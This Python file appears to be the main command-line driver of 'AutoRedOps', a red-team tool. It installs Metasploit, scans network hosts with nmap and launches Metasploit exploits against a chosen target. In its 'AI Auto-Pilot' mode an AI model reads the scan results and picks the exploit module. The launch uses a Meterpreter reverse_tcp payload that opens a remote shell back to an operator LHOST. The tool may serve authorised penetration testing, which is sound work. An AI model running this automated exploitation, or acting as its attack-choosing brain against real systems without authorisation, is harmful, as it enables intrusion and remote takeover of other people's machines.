import yaml
import sys
import subprocess
import socket
import time
import os

try:
    from scanner_nmap import NmapScanner
    from msf_rpc import MetasploitRPC
    from reporter import Reporter
    from ai_brain import AIBrain
    from payload_manager import PayloadManager
except ImportError as e:
    print(f"[-] Critical Error: Missing module: {e}")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class AutoRedOpsCLI:
    def __init__(self):
        self.clear_screen()
        self.load_config()
        print(f"{Colors.HEADER}{Colors.BOLD}=== AutoRedOps: Smart Agent Edition ==={Colors.ENDC}")
        
        self.check_and_install_metasploit()
        
        print(f"{Colors.BLUE}[*] Initializing Smart Systems...{Colors.ENDC}")
        self.scanner = NmapScanner()
        self.ai = AIBrain()
        self.payload_gen = PayloadManager()
        self.reporter = Reporter(self.config)
        
        self.start_msf_rpc()
        
        try:
            self.rpc = MetasploitRPC()
            self.rpc_available = True
            print(f"{Colors.GREEN}[+] Metasploit RPC Connected.{Colors.ENDC}")
        except:
            self.rpc_available = False

    def load_config(self):
        try:
            with open('config.yaml', 'r') as f: self.config = yaml.safe_load(f)
            with open('knowledge_base.yml', 'r') as f: self.kb = yaml.safe_load(f)
        except: sys.exit(1)

    def clear_screen(self): os.system('clear')

    def check_and_install_metasploit(self):
        try: subprocess.run(["which", "msfconsole"], check=True, stdout=subprocess.DEVNULL)
        except: 
            print("Installing Metasploit...")
            subprocess.run("apt-get update && apt-get install -y metasploit-framework", shell=True)

    def start_msf_rpc(self):
        port = self.config['metasploit']['port']
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if sock.connect_ex(('127.0.0.1', port)) == 0: return
        subprocess.Popen(f"msfrpcd -P {self.config['metasploit']['password']} -n -S -a 127.0.0.1 -p {port}", shell=True, stdout=subprocess.DEVNULL)
        time.sleep(15)

    def run(self):
        while True:
            print(f"\n{Colors.BOLD}--- COMMAND CENTER ---{Colors.ENDC}")
            print("1. üéØ Manual Mode (You Choose Attacks)")
            print("2. ü§ñ AI Auto-Pilot (AI Chooses & Attacks)")
            print("0. üö™ Exit")
            
            choice = input(f"\n{Colors.BLUE}[?] Select Option: {Colors.ENDC}").strip()
            
            if choice == '1': self.engage_target(manual=True)
            elif choice == '2': self.engage_target(manual=False) # <--- NEW SMART MODE
            elif choice == '0': sys.exit(0)

    def engage_target(self, manual=True):
        target = input(f"\n{Colors.BLUE}[?] Enter Target IP (Enter to Auto-Scan Network): {Colors.ENDC}").strip()
        if not target:
            hosts = self.scanner.discover_hosts()
            if not hosts: 
                print("[-] No hosts found.")
                return
            for i, h in enumerate(hosts): print(f"[{i+1}] {h}")
            target = hosts[int(input("Select Host: "))-1]

        # PHASE 1: SCAN
        print(f"\n{Colors.BLUE}[*] Scanning {target}...{Colors.ENDC}")
        scan_data = self.scanner.scan_target(target)
        
        # PHASE 2: ATTACK LOGIC
        exploit_results = None
        
        if manual:
            # --- OLD MANUAL LOGIC ---
            attacks = self.plan_attacks(scan_data)
            if attacks:
                print(f"\n{Colors.BOLD}--- AVAILABLE VECTORS ---{Colors.ENDC}")
                for i, atk in enumerate(attacks): print(f"[{i+1}] {atk['name']}")
                ch = int(input("\nSelect exploit (0 to skip): "))
                if ch > 0: exploit_results = self.execute_exploit(attacks[ch-1], target)
        
        else:
            # --- NEW AI AGENT LOGIC ---
            if not self.ai.client:
                print(f"{Colors.FAIL}[-] AI Brain Missing! Cannot run Auto-Pilot.{Colors.ENDC}")
                return

            print(f"\n{Colors.BLUE}[*] Sending Scan Data to AI Brain...{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] AI is thinking...{Colors.ENDC}")
            
            decision = self.ai.decide_best_attack(scan_data)
            
            if decision and decision.get('action') == 'exploit':
                print(f"\n{Colors.GREEN}================ AI DECISION ================{Colors.ENDC}")
                print(f"üß† Reasoning: {decision['reasoning']}")
                print(f"‚öîÔ∏è  Strategy:  {decision['module']}")
                print(f"üéØ Target Port: {decision['port']}")
                print(f"=============================================")
                
                confirm = input(f"\n{Colors.WARNING}[?] AUTHORIZE AI TO ATTACK? (y/n): {Colors.ENDC}").lower()
                if confirm == 'y':
                    attack_plan = {
                        'msf_module': decision['module'],
                        'payload': 'linux/x86/meterpreter/reverse_tcp', # Default, smart AI could pick this too
                        'target_port': decision['port']
                    }
                    exploit_results = self.execute_exploit(attack_plan, target)
            else:
                print(f"\n{Colors.WARNING}[*] AI decided NOT to attack (No high-confidence vectors).{Colors.ENDC}")

        self.reporter.generate_enhanced_report(scan_data, exploit_results, {})

    def plan_attacks(self, scan_results):
        attacks = []
        for p in scan_results['ports']:
            for exploit in self.kb['exploit_mappings']:
                if exploit.get('target_port') == int(p['port']): attacks.append(exploit)
        return attacks

    def execute_exploit(self, attack, target):
        lhost = input(f"{Colors.BLUE}[?] Enter LHOST (VPN/LAN IP): {Colors.ENDC}")
        print(f"{Colors.FAIL}[*] Launching {attack['msf_module']}...{Colors.ENDC}")
        result = self.rpc.execute_exploit({
            'msf_module': attack['msf_module'],
            'payload': attack['payload'], # Note: In AI mode, we might want to let AI pick payload too
            'target_port': int(attack['target_port'])
        }, target, lhost)
        
        if result['success']: print(f"{Colors.GREEN}[!!!] SHELL OPENED! Session: {result['session_id']}{Colors.ENDC}")
        else: print(f"{Colors.FAIL}[-] Exploit failed.{Colors.ENDC}")
        return result

if __name__ == "__main__":
    app = AutoRedOpsCLI()
    app.run()